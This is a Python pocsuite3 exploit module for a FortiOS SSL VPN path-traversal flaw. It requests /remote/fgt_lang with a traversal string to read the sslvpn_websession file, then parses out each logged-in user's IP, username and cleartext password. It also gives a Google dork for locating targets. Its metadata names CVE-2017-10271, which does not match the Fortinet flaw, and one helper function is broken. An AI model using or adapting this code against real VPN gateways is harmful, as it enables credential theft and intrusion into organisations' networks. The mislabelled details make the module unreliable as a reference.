from pocsuite3.api import Output, POCBase, requests, register_poc
import re

class DemoPOC(POCBase):
	vulID = 'CVE-2017-10271'  # ssvid
	version = '1.0'
	author = ['Exploit Author: Carlos E. Vieira', 'Exploit module: @dmknght']
	vulDate = '17/08/2019'
	createDate = '23/08/2019'
	updateDate = '17/08/2019'
	references = ['https://www.exploit-db.com/exploits/47288']
	name = 'SSLVPN Fortinet password leak'
	appPowerLink = ''
	appName = 'FortiOS'
	appVersion = '5.6.3 <= 5.6.7; 6.0.0 <= 6.0.4'
	vulType = 'Data Disclosure'
	desc = '''
		SSLVPN Fortinet allows attackers read password in cleartext in /dev/cmdb/sslvpn_websession via crafted URL
		Google Dork: intext:"Please Login" inurl:"/remote/login"
	'''

	def send(self,
			 headers={
				 "User-Agent": "Mozilla/5.0",
				 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				 "Connection": "close", "Upgrade-Insecure-Requests": "1"}
			 ):
		target = self.url + "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
		response = requests.get(target, headers=headers, verify=False, stream=True)
		return response.raw.read()

	def _verify(self):
		output = Output(self)
		response = str(self.send())
		if "var fgt_lang =" in response:
			result = {}
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = self.url
			output.success(result)
		else:
			output.fail('Target is not vulnerable')
		return output

	def _attack(self):
		response = self.send()
		if "var fgt_lang =" in str(response):
			data = ""

			def is_character_printable(s):
				# return all((ord(c) < 127) and (ord(c) >= 32) for c in s)
				if ((ord(c) < 127) and (ord(c) >= 32) for c in str(s)):
					return True
				return False

			def is_printable(byte):
				if is_character_printable(byte):
					return byte
				else:
					return '.'

			for byte in response:
				if byte < 127 and byte >= 32:
					data += chr(byte)
				elif byte == 10:
					data += "\n"
				else:
					if data[-3::] == "...":
						pass
					else:
						data += "."

			find_data = r"(?:\.\.\.)([0-9\.]+)\.\.\.([a-zA-Z0-9\-_]+)\.\.\.([a-zA-Z0-9\-_]+)\.\.\.([a-zA-Z0-9\-\_]+)\.\.([a-zA-Z0-9\-_]+)\.\.\.([a-zA-Z0-9\-_]+)"
			ret = "\n"
			for dIP, dUser, dPassword, dDomain, dPermission, dGroup in re.findall(find_data, data):
				if dUser not in ret:
					ret += "[IP: %s] [User: %s] [Pwd: %s] [Domain: %s] [Perm: %s] [Group: %s]\n" %(
						dIP, dUser, dPassword, dDomain, dPermission, dGroup
					)
			result = {}
			result['Leak'] = {}
			result['Leak']['DataLeak'] = ret
			output = Output(self)
			output.success(result)
			return output

	def _exploit(self):
		self._attack()


register_poc(DemoPOC)
